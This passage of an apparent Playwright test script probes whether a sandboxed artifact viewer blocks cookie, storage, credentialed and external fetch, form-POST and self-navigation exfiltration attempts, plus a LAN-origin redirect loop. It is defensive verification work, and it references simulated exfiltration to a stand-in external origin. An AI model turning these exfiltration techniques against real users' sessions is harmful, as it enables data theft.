        // normalization needed (unlike a parsed live Set-Cookie header,
        // there is no server-emitted casing to preserve here).
        sameSite: authCookie.sameSite,
      },
      {
        name: cookieControlName,
        value: cookieControlValue,
        domain: '127.0.0.1',
        path: '/',
        httpOnly: false,
        secure: false,
        sameSite: 'Lax',
      },
    ]);

    // ---------------------------------------------------------------
    // Harness self-test (mirrors the #1162 precedent): prove the
    // postMessage-bridge detection mechanism actually observes messages
    // BEFORE trusting a "no messages received" result for the real probe.
    // ---------------------------------------------------------------
    console.log('\n==> harness self-test (confirms the postMessage bridge actually observes messages)');
    const harnessPage = await context.newPage();
    await harnessPage.setContent('<!doctype html><html><body></body></html>');
    await harnessPage.evaluate(() => {
      window.__probeMessages = [];
      window.addEventListener('message', (e) => window.__probeMessages.push(e.data));
    });
    await harnessPage.evaluate(() => {
      const iframe = document.createElement('iframe');
      // No escaping needed here: this string literal lives in a plain
      // .mjs source file, not inside an actual HTML <script> tag of THIS
      // file, so a literal </script> in the string is syntactically
      // inert JS text -- unlike the reverse case (embedding this content
      // inside an HTML <script> block), which WOULD need `<\/script>` to
      // avoid the HTML parser prematurely closing the enclosing tag.
      iframe.src = "data:text/html,<script>parent.postMessage({type:'self-test'},'*')</script>";
      document.body.appendChild(iframe);
    });
    await harnessPage.waitForTimeout(500);
    const selfTestMessages = await harnessPage.evaluate(() => window.__probeMessages);
    if (!selfTestMessages.some((m) => m.type === 'self-test')) {
      console.error(
        '  FAIL  self-test: the postMessage bridge did not observe a known-firing test message. ' +
          'The detection mechanism itself is broken -- aborting without reporting probe results (unreliable).',
      );
      await browser.close();
      cleanupAndExit(disposableHome, 2);
    }
    console.log('  OK    self-test: postMessage bridge correctly observed the test message');
    await harnessPage.close();

    // ---------------------------------------------------------------
    // Real probe: navigate DIRECTLY to the production viewer shell
    // (`/artifacts/:id`), not the raw endpoint. With the navigation jail
    // now mandatory, the representative real-world scenario is the shell
    // being the top-level document with the artifact nested inside it
    // (the server-rendered `<iframe sandbox="allow-scripts"
    // src="/api/artifacts/:id">`) -- so this probe now exercises the REAL
    // production shell HTML, not a synthetic harness-constructed iframe.
    // ---------------------------------------------------------------
    console.log(`\n==> navigating directly to the production viewer shell: ${artifactShellUrl}`);
    const probePage = await context.newPage();
    // Arm 5 detection, second signal (see the arm-5 assertion below for
    // why): a blocked `<form>` submission inside a sandboxed iframe that
    // lacks `allow-forms` is NOT a CSP violation at all -- it is blocked by
    // the iframe sandbox itself, BEFORE CSP's `form-action` directive is
    // ever consulted, and Chromium reports it only via a `console.error`
    // ("Blocked form submission to '...' because the form's frame is
    // sandboxed and the 'allow-forms' permission is not set."), never via
    // `securitypolicyviolation`. Page-level `console` events capture
    // messages from child iframes too (confirmed empirically), so this
    // listener sees the sandboxed artifact iframe's own console output.
    const sandboxConsoleMessages = [];
    probePage.on('console', (msg) => {
      if (msg.type() === 'error') sandboxConsoleMessages.push(msg.text());
    });
    // Attach the postMessage listener AND the shell-page securitypolicyviolation
    // collector (arm 6's authoritative P7 signal -- CSP dispatches
    // frame-src violations on the EMBEDDING document, i.e. this shell page,
    // not on the artifact iframe that attempted the blocked navigation) via
    // addInitScript, so both are registered BEFORE the shell's own
    // server-rendered <iframe> has a chance to load and the artifact script
    // inside it has a chance to run -- avoids a race where early messages
    // (or an early violation) would otherwise be lost between navigation
    // and a post-hoc evaluate() call.
    await probePage.addInitScript(() => {
      window.__probeMessages = [];
      window.addEventListener('message', (e) => window.__probeMessages.push(e.data));
      window.__cspViolations = [];
      document.addEventListener('securitypolicyviolation', (e) => {
        window.__cspViolations.push({
          violatedDirective: e.violatedDirective,
          blockedURI: e.blockedURI,
          disposition: e.disposition,
        });
      });
    });
    await probePage.goto(artifactShellUrl);

    // Capture arm 7a's evidence EARLY -- a short settle wait after the
    // initial navigation, well BEFORE arm 6 (the LAST arm in the
    // artifact's own script, see buildProbeArtifactHtml) gets a chance to
    // run. This ordering matters: arm 6's blocked self-navigation replaces
    // the child frame's content with a Chromium error interstitial
    // (`chrome-error://chromewebdata/`, confirmed empirically), so
    // capturing the child frame's URL AFTER arm 6 has fired would no
    // longer reflect "the real iframe-embedded load served bytes
    // directly" -- it would reflect the LATER, unrelated interstitial.
    await probePage.waitForTimeout(300);
    const earlyChildFrames = probePage.frames().filter((f) => f !== probePage.mainFrame());
    expect(
      earlyChildFrames.length === 1,
      'arm 7a precondition: exactly one child iframe is present inside the shell shortly after navigation',
      `count=${earlyChildFrames.length}, urls=${JSON.stringify(earlyChildFrames.map((f) => f.url()))}`,
    );
    if (earlyChildFrames.length === 1) {
      // Compare pathname only (strip any query string): the shell now
      // embeds a per-render viewer token in the iframe src as `?vt=...`
      // (Issue #1366, S2) -- the production `Sec-Fetch-Dest: iframe`
      // branch ignores that token entirely (P6'-a, header wins outright),
      // so its presence/value is irrelevant to what THIS assertion proves
      // (a genuine iframe-embedded load gets raw bytes, no redirect).
      expect(
        earlyChildFrames[0].url().split('?')[0] === artifactUrl,
        'arm 7a: the real browser iframe-embedded load of the raw endpoint served bytes directly (no redirect to the shell)',
        `childFrame.url()=${earlyChildFrames[0].url()}, expected pathname=${artifactUrl}`,
      );
    }

    // Wait for the REMAINING arms to report. Arms 3-5 chain sequentially
    // (fetch round trips + arm 5's 500ms internal delay), and arm 6 (the
    // self-navigation attempt) runs LAST, only after arm 5 has already
    // posted -- see buildProbeArtifactHtml's comment on why. Generous
    // headroom for the full chain plus the interstitial replacement to
    // settle.
    await probePage.waitForTimeout(2500);
    const messages = await probePage.evaluate(() => window.__probeMessages);
    const byType = Object.fromEntries(messages.map((m) => [m.type, m.detail]));
    const shellCspViolations = await probePage.evaluate(() => window.__cspViolations);

    console.log(`\n==> arm results (${messages.length} message(s) received)`);

    // Arm 0, gating.
    expect('script-ran' in byType, 'arm 0 (gating): probe artifact script executed', 'no script-ran message received');
    if (!('script-ran' in byType)) {
      console.error('  Aborting remaining assertions -- arm 0 did not fire, so every other result would be vacuous.');
      await browser.close();
      cleanupAndExit(disposableHome, 1);
    }

    // Arm 1: cookie.
    const cookieResult = byType['cookie-result'];
    expect(!!cookieResult, 'arm 1: cookie-result message received');
    if (cookieResult) {
      // Blocked means EITHER document.cookie threw (the spec-correct
      // opaque-origin behavior), OR it returned a value that does not
      // include the JS-readable marker cookie (some engines may return
      // '' without throwing). Checking for the marker specifically
      // (rather than bare emptiness) also confirms this isn't a false
      // pass caused by HttpOnly hiding the OTHER cookie -- the marker is
      // deliberately non-HttpOnly, so its absence here is attributable
      // only to the sandbox's opaque origin.
      const cookieBlocked = cookieResult.threw || !(cookieResult.value ?? '').includes(cookieControlName);
      expect(
        cookieBlocked,
        'arm 1: document.cookie is inaccessible from the sandboxed artifact (opaque origin)',
        `threw=${cookieResult.threw}, value=${JSON.stringify(cookieResult.value)}`,
      );
    }

    // Arm 2: localStorage.
    const lsResult = byType['localstorage-result'];
    expect(!!lsResult, 'arm 2: localstorage-result message received');
    if (lsResult) {
      expect(
        lsResult.threw === true,
        'arm 2: localStorage is inaccessible from the sandboxed artifact (opaque origin)',
        `threw=${lsResult.threw}, value=${JSON.stringify(lsResult.value)}`,
      );
    }

    // Arm 3 (connect wall, layer 2): credentialed same-origin fetch. See
    // header comment "ARM 3 -- THE CONNECT WALL (layer 2), NOT P2" for
    // the two-wall structure this arm does and does not prove.
    const credFetchResult = byType['credentialed-fetch-result'];
    expect(!!credFetchResult, 'arm 3: credentialed-fetch-result message received');
    if (credFetchResult) {
      console.log(`  DETAIL credentialed-fetch-result: ${JSON.stringify(credFetchResult)}`);

      // (a) Client-side: the fetch() call must reject with a TypeError
      // specifically -- the network-level-block failure mode. A bare
      // "did not return a successful body" is not the same failure and
      // would not distinguish a CSP connect-block from, say, a 401.
      expect(
        credFetchResult.networkOk === false && credFetchResult.errorName === 'TypeError',
        'arm 3 (connect wall): client-side fetch() rejected with a TypeError (CSP network-level block)',
        `networkOk=${credFetchResult.networkOk}, errorName=${credFetchResult.errorName}, message=${credFetchResult.message}`,
      );

      // (b) Server-side non-observation: zero requests to the target
      // route (GET /api/auth/me) recorded during the sandboxed
      // artifact's execution window, via the pathname-specific
      // requestLog populated by the Bun.serve monkey-patch above (the
      // real network entry point). Deliberately NOT asserted in
      // isolation -- see the positive-control attribution assertion
      // below, which proves the SAME log correctly records exactly one
      // entry when the identical request is actually made immediately
      // afterward, ruling out "logging silently broke" or "wrong route
      // name" as a false-pass cause for this zero-count.
      const authMeRequestsDuringSandboxWindow = requestLog.filter((r) => r.pathname === '/api/auth/me');
      expect(
        authMeRequestsDuringSandboxWindow.length === 0,
        "arm 3 (connect wall): server recorded ZERO requests to /api/auth/me during the sandboxed artifact's execution window",
        `observed ${authMeRequestsDuringSandboxWindow.length} request(s): ${JSON.stringify(authMeRequestsDuringSandboxWindow)}`,
      );
    }

    // Arm 4: external fetch (CSP resource restriction).
    const extFetchResult = byType['external-fetch-result'];
    expect(!!extFetchResult, 'arm 4: external-fetch-result message received');
    if (extFetchResult) {
      expect(
        extFetchResult.networkOk === false,
        'arm 4: external fetch is blocked (CSP default-src \'none\')',
        `networkOk=${extFetchResult.networkOk}, detail=${JSON.stringify(extFetchResult)}`,
      );
    }

    // Arm 5: external form POST (blocked by the sandbox missing
    // `allow-forms`, and/or by CSP's `form-action 'none'`).
    const extFormResult = byType['external-form-result'];
    expect(!!extFormResult, 'arm 5: external-form-result message received');
    if (extFormResult) {
      // Score formActionViolationObserved OR a genuine positive-evidence
      // console signal -- NOT navigatedAway (the sandbox token set already
      // omits `allow-top-navigation`, so `navigatedAway` is near-always
      // false regardless of whether the form submission was actually
      // blocked; that branch doesn't prove what it claims to and is kept
      // in the failure detail only).
      //
      // Empirically (verified against real Chromium), form.submit() inside
      // this sandbox is blocked at the iframe-sandbox layer -- missing
      // `allow-forms` disables ALL form submission unconditionally, BEFORE
      // CSP's form-action directive is ever consulted -- so
      // formActionViolationObserved is reliably false here and would make
      // this assertion fail deterministically if scored alone. Chromium
      // reports the sandbox-layer block only via a console.error, captured
      // page-side above into sandboxConsoleMessages. Either signal is
      // real, unambiguous positive evidence that the submission was
      // blocked (never a same-status-regardless-of-outcome fallback like
      // navigatedAway was).
      const sandboxFormBlockObserved = sandboxConsoleMessages.some(
        (m) => /sandboxed/i.test(m) && /allow-forms/i.test(m),
      );
      expect(
        extFormResult.formActionViolationObserved === true || sandboxFormBlockObserved,
        'arm 5: external form POST is blocked (sandbox missing allow-forms, and/or CSP form-action \'none\')',
        `detail=${JSON.stringify(extFormResult)}, sandboxConsoleMessages=${JSON.stringify(sandboxConsoleMessages)}`,
      );
    }

    // Arm 6: self-navigation exfiltration attempt (P7 -- the shell's
    // frame-src). Two independent, authoritative signals; the artifact's
    // own postMessage (self-navigation-result) is corroborating only (see
    // its own comment in buildProbeArtifactHtml for why its absence is
    // EXPECTED, not a failure indicator).
    console.log(`  DETAIL self-navigation-result: ${JSON.stringify(byType['self-navigation-result'])}`);
    console.log(`  DETAIL shell page securitypolicyviolation events: ${JSON.stringify(shellCspViolations)}`);

    // Signal (a): Playwright-level child-frame URL introspection -- the
    // artifact's iframe must NEVER have reached the exfiltration target.
    // NOTE (empirically discovered against real Chromium): a
    // frame-src-blocked navigation does not leave the child frame parked
    // at its ORIGINAL url -- Chromium replaces the frame's content with an
    // error interstitial (`chrome-error://chromewebdata/`) once the
    // blocked navigation is attempted. The correct assertion is therefore
    // "never navigated to the attacker's origin", not "still at the
    // original url" -- arm 7a (below) is what proves the original,
    // pre-attempt load was the real raw endpoint.
    const postArm6ChildFrames = probePage.frames().filter((f) => f !== probePage.mainFrame());
    expect(
      postArm6ChildFrames.length === 1,
      'arm 6 precondition: exactly one child iframe is present inside the shell after the self-navigation attempt',
      `count=${postArm6ChildFrames.length}, urls=${JSON.stringify(postArm6ChildFrames.map((f) => f.url()))}`,
    );
    if (postArm6ChildFrames.length === 1) {
      // Compare the parsed origin, not a string prefix: a substring/prefix
      // check (`.startsWith('https://example.com')`) would also match an
      // attacker-controlled lookalike like `https://example.com.evil.com`,
      // which is exactly the imprecision a probe whose whole value rests on
      // exact assertions must not carry (CodeQL
      // js/incomplete-url-substring-sanitization). `new URL(...).origin`
      // throws on an unparseable value -- the post-block interstitial
      // (`chrome-error://chromewebdata/`) is exactly such a value and is a
      // legitimate, already-documented post-block state, so a parse failure
      // here means "definitely not the target origin" (pass), not an error.
      let childOrigin = null;
      try {
        childOrigin = new URL(postArm6ChildFrames[0].url()).origin;
      } catch {
        // unparseable (e.g. chrome-error://chromewebdata/) -- treat as "not the target origin"
      }
      expect(
        childOrigin !== 'https://example.com',
        'arm 6: the artifact iframe never reached the exfiltration target (self-navigation to an external origin did not succeed)',
        `childFrame.url()=${postArm6ChildFrames[0].url()}, parsedOrigin=${childOrigin}`,
      );
    }

    // Signal (b): a frame-src securitypolicyviolation observed on the
    // SHELL page (the embedding document CSP governs a child's navigation
    // attempts, including self-navigation) -- the wall that actually fired.
    const frameSrcViolation = shellCspViolations.find((v) => /frame-src/i.test(v.violatedDirective));
    expect(
      !!frameSrcViolation,
      "arm 6: the shell page observed a frame-src securitypolicyviolation for the artifact's self-navigation attempt",
      `shellCspViolations=${JSON.stringify(shellCspViolations)}`,
    );

    // Arm 7a assertion itself lives earlier in this script (captured via
    // `earlyChildFrames`, BEFORE arm 6 had a chance to replace the child
    // frame's content) -- see the comment there for why the timing matters.

    await probePage.close();

    // Arm 7b: a direct top-level browser navigation to the RAW artifact
    // URL (a separate page/tab from the main probe) must redirect to the
    // viewer shell rather than rendering the artifact directly at the top
    // level. Playwright's page.goto() follows redirects the same way a
    // real browser does, so the final page.url() is the definitive signal.
    const directPage = await context.newPage();
    await directPage.goto(artifactUrl);
    expect(
      directPage.url() === artifactShellUrl,
      'arm 7b: a real top-level browser navigation to the RAW artifact URL redirects to the viewer shell (P6)',
      `directPage.url()=${directPage.url()}, expected=${artifactShellUrl}`,
    );
    await directPage.close();

    // Arm 7b complementary check: a plain fetch() from THIS script's own
    // Node/Bun process (no browser, no Fetch Metadata headers at all)
    // against the raw endpoint -- the ABSENT case specifically, distinct
    // from the real browser's Sec-Fetch-Dest: document covered just above.
    // This is the case P6's design doc calls out as mattering most (the
    // fail-closed default for old browsers / non-browser HTTP clients).
    const nodeSideRawFetch = await fetch(artifactUrl, { headers: { Cookie: cookieHeader }, redirect: 'manual' });
    expect(
      nodeSideRawFetch.status === 302 || nodeSideRawFetch.type === 'opaqueredirect',
      'arm 7b (absent case): a plain Node-side fetch() with no Sec-Fetch-Dest header redirects instead of receiving raw bytes',
      `status=${nodeSideRawFetch.status}, type=${nodeSideRawFetch.type}`,
    );
    if (nodeSideRawFetch.status === 302) {
      expect(
        nodeSideRawFetch.headers.get('Location') === toolResult.path,
        'arm 7b (absent case): the redirect Location is the viewer shell path',
        `Location=${nodeSideRawFetch.headers.get('Location')}, expected=${toolResult.path}`,
      );
    }
    await nodeSideRawFetch.text().catch(() => {});

    // ---------------------------------------------------------------
    // Arm 8 (Issue #1366, V1): header-blind origin -- plain HTTP,
    // non-localhost LAN IP. Browsers only attach Sec-Fetch-* (Fetch
    // Metadata) headers to requests whose target origin is "potentially
    // trustworthy" (HTTPS, or localhost/127.0.0.1) -- a plain-HTTP LAN IP
    // origin never gets them, including from the shell's own genuine
    // iframe subresource load. Pre-fix, this fed the request straight back
    // into the shell (P6's unconditional `Sec-Fetch-Dest !== 'iframe'` ->
    // redirect), which requested this endpoint again, absent the header
    // again -- reproduced as an unbounded shell-inside-shell loop
    // (single-user mode) or a shorter loop terminating in a raw
    // `{"error":"Unauthorized"}` state (multi-user mode specifically,
    // this script's own mode -- the second-nested shell's iframe runs
    // inside an opaque-origin ancestor, breaking the browser's same-site
    // cookie computation and withholding the `SameSite=Lax` auth cookie).
    // Post-fix (P6'-b), the shell-minted single-use token lets the same
    // endpoint recognize the shell's own genuine load without needing
    // `Sec-Fetch-Dest`, breaking the loop.
    //
    // Per AC V1: asserts the premise (zero Sec-Fetch-Dest headers reach
    // the server from this origin), that the shell renders EXACTLY ONCE
    // with the iframe receiving raw bytes (the postMessage harness
    // confirms script execution, same protocol as arms 0-7), no nested
    // shell, no aborted request -- and, since this script runs in
    // multi-user mode, that the previously-observed terminal
    // `Unauthorized` end-state does not occur either.
    // ---------------------------------------------------------------
    console.log('\n==> arm 8: header-blind origin (plain HTTP, non-localhost LAN IP) -- Issue #1366');
    const lanIp = resolveLanIPv4();
    if (!lanIp) {
      console.error(
        '  FAIL  arm 8 precondition: no non-internal IPv4 interface found on this machine ' +
          '(os.networkInterfaces() returned none). Cannot exercise the header-blind-origin scenario for ' +
          'real -- STOPPING per instructions rather than substituting a simulation.',
      );
      await browser.close();
      cleanupAndExit(disposableHome, 2);
    }
    const lanBaseUrl = `http://${lanIp}:${port}`;
    const lanArtifactShellUrl = `${lanBaseUrl}${toolResult.path}`;
    const lanArtifactUrl = `${lanBaseUrl}/api${toolResult.path}`;
    console.log(`  INFO  resolved LAN IPv4: ${lanIp}; target shell URL: ${lanArtifactShellUrl}`);

    // Reachability precondition: a plain fetch() against /health via the
    // LAN IP, bounded by a short timeout. STOP (do not simulate) if
    // unreachable -- explicit, non-negotiable per this dispatch.
    let lanReachable = false;
    let lanReachErr = null;
    try {
      const ac = new AbortController();
      const timer = setTimeout(() => ac.abort(), 5000);
      const healthRes = await fetch(`${lanBaseUrl}/health`, { signal: ac.signal });
      clearTimeout(timer);
      lanReachable = healthRes.ok;
      await healthRes.text().catch(() => {});
    } catch (err) {
      lanReachErr = err;
    }
    if (!lanReachable) {
      console.error(
        `  FAIL  arm 8 precondition: could not reach ${lanBaseUrl}/health over plain HTTP (${lanReachErr}). ` +
          'STOPPING per instructions rather than substituting a simulation.',
      );
      await browser.close();
      cleanupAndExit(disposableHome, 2);
    }
    console.log(`  OK    arm 8 precondition: ${lanBaseUrl}/health is reachable over plain HTTP`);

    // No separate LAN-IP login needed: the session credential is a JWT
    // (see CREDENTIAL-ISSUANCE SUBSTITUTION header comment), which is not
    // origin-bound -- only the injected COOKIE's own `domain` attribute
    // governs whether a browser attaches it to a given origin. Reuse the
    // SAME token minted earlier for the primary flow, just under a cookie
    // scoped to this LAN IP instead of 127.0.0.1.
    console.log(`  INFO  arm 8: reusing the same real session credential (minted once for OS user '${osUsername}') for the LAN-IP origin`);

    // Fresh, isolated browser context -- deliberately NOT the `context`
    // used by arms 0-7/positive controls (scoped to the 127.0.0.1 cookie
    // jar): mirrors a genuinely fresh browser session opening the LAN URL
    // for the first time, matching the Issue's manual reproduction.
    const lanContext = await browser.newContext();
    await lanContext.addCookies([
      {
        name: authCookie.name,
        value: authCookie.value,
        domain: lanIp,
        path: authCookie.path,
        httpOnly: authCookie.httpOnly,
        secure: authCookie.secure,
        sameSite: authCookie.sameSite,
      },
    ]);

    const lanPage = await lanContext.newPage();
    const lanRequestLog = [];
    lanPage.on('request', (req) => {
      lanRequestLog.push({ url: req.url(), method: req.method(), headers: req.headers() });
    });
    const lanResponseLog = [];
    lanPage.on('response', (res) => {
      lanResponseLog.push({ url: res.url(), status: res.status() });
    });
    const lanFailedRequests = [];
    lanPage.on('requestfailed', (req) => {
      lanFailedRequests.push({ url: req.url(), failure: req.failure()?.errorText });
    });
    const lanPageErrors = [];
    lanPage.on('pageerror', (err) => lanPageErrors.push(String(err)));
    const lanConsoleErrors = [];
    lanPage.on('console', (msg) => {
      if (msg.type() === 'error') lanConsoleErrors.push(msg.text());
    });
    // Same postMessage-bridge protocol as arms 0-7's probePage (see
    // buildProbeArtifactHtml): registered via addInitScript so it is live
    // BEFORE the shell's own server-rendered iframe has a chance to load,
    // same race-avoidance rationale as the primary probe above.
    await lanPage.addInitScript(() => {
      window.__probeMessages = [];
      window.addEventListener('message', (e) => window.__probeMessages.push(e.data));
    });

    let lanGotoError = null;
    try {
      await lanPage.goto(lanArtifactShellUrl, { timeout: 15000 });
    } catch (err) {
      lanGotoError = String(err);
    }

    // Capture the "no nested shell" evidence EARLY -- same rationale as
    // the primary probe's arm 7a (see its own comment above): this
    // script's probe artifact (buildProbeArtifactHtml) is the SAME
    // artifact reused for this arm, and its arm 6 (self-navigation) fires
    // ~1-1.5s into script execution and replaces whichever frame it runs
    // in with a Chromium error interstitial (`chrome-error://chromewebdata/`)
    // once blocked -- capturing frame state AFTER that has already fired
    // would misreport an interstitial as "nested shell" or "raw bytes".
    await lanPage.waitForTimeout(300);
    const lanEarlyChildFrames = lanPage.frames().filter((f) => f !== lanPage.mainFrame());
    const lanEarlyChildFrameUrls = lanEarlyChildFrames.map((f) => f.url());

    // Bounded settle wait for everything else (postMessage messages,
    // request/response logs, console errors) -- long enough for several
    // levels of the suspected nested-shell recursion to play out (or the
    // request chain to abort), short enough not to hang the script
    // indefinitely if the browser does not self-terminate the loop.
    await lanPage.waitForTimeout(5700);

    const lanFinalUrl = lanPage.url();
    const lanFrames = lanPage.frames();
    const lanFrameUrls = lanFrames.map((f) => f.url());
    const lanMessages = await lanPage.evaluate(() => window.__probeMessages ?? []);

    // Always logged, regardless of pass/fail below -- this is the evidence
    // trail the PR body's polarity section quotes verbatim.
    info('arm 8 observation: final top-level page URL after goto() + settle wait', lanFinalUrl);
    info(
      'arm 8 observation: EARLY child frame count + URLs (~300ms after goto, before arm 6 can fire)',
      `count=${lanEarlyChildFrames.length}, urls=${JSON.stringify(lanEarlyChildFrameUrls)}`,
    );
    info(
      'arm 8 observation: child frame count + URLs after the FULL settle wait (post arm-6 self-navigation attempt)',
      `count=${lanFrames.length}, urls=${JSON.stringify(lanFrameUrls)}`,
    );
    info('arm 8 observation: goto() error (if any)', lanGotoError ?? '(none -- goto() resolved normally)');
    info(
      'arm 8 observation: requests to /artifacts/... or /api/artifacts/... (chronological)',
      JSON.stringify(
        lanRequestLog
          .filter((r) => r.url.includes('/artifacts/'))
          .map((r) => ({ url: r.url, secFetchDest: r.headers['sec-fetch-dest'] ?? '(absent)' })),
      ),
    );
    info(
      'arm 8 observation: responses to /artifacts/... or /api/artifacts/... (chronological, with status)',
      JSON.stringify(lanResponseLog.filter((r) => r.url.includes('/artifacts/'))),
    );
    info('arm 8 observation: requestfailed events', JSON.stringify(lanFailedRequests));
    info('arm 8 observation: pageerror events', JSON.stringify(lanPageErrors));
    info('arm 8 observation: console.error messages', JSON.stringify(lanConsoleErrors));
    info('arm 8 observation: total request count to this origin during the settle window', String(lanRequestLog.length));
    info('arm 8 observation: postMessage bridge messages received', JSON.stringify(lanMessages));

    // PREMISE (blocking): zero requests to this LAN origin carry a
    // Sec-Fetch-Dest header -- the load-bearing premise the whole Issue
    // #1366 diagnosis rests on. If violated on this environment/browser
    // version, the reproduction itself is invalid and must be reported as
    // a finding, not routed around.
    const requestsWithSecFetchDest = lanRequestLog.filter((r) => 'sec-fetch-dest' in r.headers);
    expect(
      requestsWithSecFetchDest.length === 0,
      'arm 8 premise: zero requests to the plain-HTTP LAN-IP origin carry a Sec-Fetch-Dest header',
      `found ${requestsWithSecFetchDest.length} request(s) with the header: ${JSON.stringify(
        requestsWithSecFetchDest.map((r) => ({ url: r.url, secFetchDest: r.headers['sec-fetch-dest'] })),
      )}`,
    );

    // AC V1 (blocking): the shell renders EXACTLY ONCE -- exactly one
    // child frame, and it is the raw artifact endpoint itself (not another
    // copy of the shell). Evaluated on the EARLY snapshot (see capture
    // comment above) -- a later snapshot would conflate the self-navigation
    // arm's interstitial replacement with a nested-shell symptom.
    expect(
      lanEarlyChildFrames.length === 1,
      'arm 8 (V1): the shell renders exactly once -- exactly one child iframe present shortly after navigation (no nested shell)',
      `count=${lanEarlyChildFrames.length}, urls=${JSON.stringify(lanEarlyChildFrameUrls)}`,
    );
    if (lanEarlyChildFrameUrls.length === 1) {
      // IMPORTANT: use the already-captured STRING snapshot
      // (`lanEarlyChildFrameUrls`), never re-call `.url()` on the live
      // `Frame` object at this point -- `Frame.url()` is a live getter,
      // and by the time this assertion runs (after the further ~5.7s
      // settle wait below), arm 6's self-navigation may have already
      // replaced the frame's content with the Chromium error interstitial,
      // which would make a live re-read misreport the EARLY state as the
      // LATE one (this was caught empirically: the info() line correctly
      // showed the raw artifact URL while a live re-read here showed
      // `chrome-error://chromewebdata/`).
      expect(
        lanEarlyChildFrameUrls[0].split('?')[0] === lanArtifactUrl,
        'arm 8 (V1): the single child iframe is the raw artifact endpoint (not a second copy of the shell)',
        `childFrame.url()=${lanEarlyChildFrameUrls[0]}, expected pathname=${lanArtifactUrl}`,
      );
    }

    // AC V1 (blocking): the iframe receives raw bytes -- the postMessage
    // harness confirms script execution, same gating signal as arm 0.
    expect(
      lanMessages.some((m) => m.type === 'script-ran'),
      'arm 8 (V1): the artifact iframe received raw bytes and its script executed (script-ran received via postMessage)',
      `messages received: ${JSON.stringify(lanMessages)}`,
    );

    // AC V1 (blocking): no aborted request (the reported net::ERR_ABORTED
    // end-state).
    expect(
      lanFailedRequests.length === 0,
      'arm 8 (V1): no request to this origin failed/aborted during the settle window',
      `failed requests: ${JSON.stringify(lanFailedRequests)}`,
    );

    // AC V1 (blocking, multi-user-mode-specific): the previously-observed
    // terminal Unauthorized end-state does not occur -- no 401 response to
    // the raw endpoint, and no "Unauthorized" console error.
    const unauthorizedResponses = lanResponseLog.filter(
      (r) => r.url.includes('/api/artifacts/') && r.status === 401,
    );
    expect(
      unauthorizedResponses.length === 0,
      'arm 8 (V1, multi-user mode): no 401 Unauthorized response to the raw artifact endpoint (the previously-observed terminal auth-failure end-state)',
      `401 responses: ${JSON.stringify(unauthorizedResponses)}`,
    );
    expect(
      !lanConsoleErrors.some((m) => /401|Unauthorized/i.test(m)),
      'arm 8 (V1, multi-user mode): no console error mentioning 401/Unauthorized',
      `console errors: ${JSON.stringify(lanConsoleErrors)}`,
    );

    await lanPage.close();

    // ---------------------------------------------------------------
    // Arm 8b (Issue #1366, V2): top-level opens of the RAW artifact URL
    // from the SAME header-blind LAN origin -- P7 must hold there too.
    // Reuses `lanContext` (same LAN-scoped auth cookie) but each case is a
    // fresh page, a fresh top-level navigation, mirroring how a user would
    // actually reach these URLs (a bookmark, a pasted link, a stale tab).
    // ---------------------------------------------------------------
    console.log('\n==> arm 8b: top-level opens of the raw artifact URL, header-blind LAN origin (V2)');

    // In-process import (module-cache identity, same rationale as the
    // "SERVER LIFECYCLE" header comment) -- mint/consume against the SAME
    // token store the disposable server's own routes use, not a
    // reimplementation.
    const { mintArtifactViewerToken, consumeArtifactViewerToken } = await import(
      '../../packages/server/src/lib/artifact-viewer-tokens.ts'
    );

    // (a) No token at all -- must redirect to the shell, never raw bytes.
    const noTokenPage = await lanContext.newPage();
    await noTokenPage.goto(lanArtifactUrl);
    expect(
      noTokenPage.url() === lanArtifactShellUrl,
      'arm 8b (V2): top-level open of the raw URL with NO token redirects to the viewer shell',
      `finalUrl=${noTokenPage.url()}, expected=${lanArtifactShellUrl}`,
    );
    const noTokenCsp = await noTokenPage.evaluate(() => document.querySelector('iframe') !== null);
    expect(
      noTokenCsp,
      'arm 8b (V2): the landed page is the shell (contains the wrapper iframe), not the raw artifact document',
    );
    await noTokenPage.close();

    // (b) A SPENT (already-consumed) token -- must also redirect, never
    // raw bytes. Minted and immediately consumed directly against the
    // SAME in-process token store the disposable server uses (module-cache
    // identity, same rationale as the SERVER LIFECYCLE header comment).
    const spentTokenPage = await lanContext.newPage();
    // Guard the fixture's own precondition first (mirrors
    // check-artifact-server-story-e2e.mjs's V2 assertion on the same
    // field): without this, an undefined toolResult.artifactId would still
    // make the mint/consume pair "pass" -- both sides using `undefined` as
    // the id -- proving nothing about the actual id-bound behavior below.
    expect(!!toolResult.artifactId, 'arm 8b (V2) setup: toolResult carries an artifactId', JSON.stringify(toolResult));
    const spentToken = mintArtifactViewerToken(toolResult.artifactId);
    const consumedOk = consumeArtifactViewerToken(spentToken, toolResult.artifactId);
    expect(consumedOk, 'arm 8b (V2) setup: the spent-token fixture actually consumed successfully before use');
    await spentTokenPage.goto(`${lanArtifactUrl}?vt=${spentToken}`);
    expect(
      spentTokenPage.url() === lanArtifactShellUrl,
      'arm 8b (V2): top-level open of the raw URL with a SPENT token redirects to the viewer shell',
      `finalUrl=${spentTokenPage.url()}, expected=${lanArtifactShellUrl}`,
    );
    await spentTokenPage.close();

    await lanContext.close();

    // ---------------------------------------------------------------
    // Positive controls -- SAME run, SAME browser context (same cookie
    // jar). "No control, no pass": these prove the walls above are the
    // SANDBOX's, not the environment's, and that the echo route + cookie
    // auth genuinely work (so arm 3's rejection, when observed, is
    // attributable to the boundary).
    // ---------------------------------------------------------------
    console.log('\n==> positive controls (same run, non-sandboxed page on the same server)');
    const controlPage = await context.newPage();
    // /health is served by the real disposable server (not gated by
    // /api's authMiddleware), so it is a normal, non-sandboxed page at
    // the artifact's own origin -- exactly what the controls need.
    await controlPage.goto(`${baseUrl}/health`);

    const controlCookie = await controlPage.evaluate(() => document.cookie);
    // Checked against the non-HttpOnly marker cookie, NOT the real auth
    // cookie: the auth cookie is HttpOnly by production design
    // (routes/auth.ts), so it is invisible to document.cookie on EVERY
    // page regardless of sandboxing -- asserting on it here would not
    // distinguish the sandbox's opaque-origin block from ordinary
    // HttpOnly semantics.
    expect(
      controlCookie.includes(cookieControlName),
      'control: document.cookie IS readable from a normal (non-sandboxed) page',
      `value=${JSON.stringify(controlCookie)}`,
    );

    const controlLs = await controlPage.evaluate(() => {
      try {
        localStorage.setItem('control', '1');
        return { threw: false, value: localStorage.getItem('control') };
      } catch (err) {
        return { threw: true, message: String(err) };
      }
    });
    expect(
      controlLs.threw === false,
      'control: localStorage IS accessible from a normal (non-sandboxed) page',
      JSON.stringify(controlLs),
    );

    const controlFetch = await controlPage.evaluate(async () => {
      const res = await fetch('/api/auth/me', { credentials: 'include' });
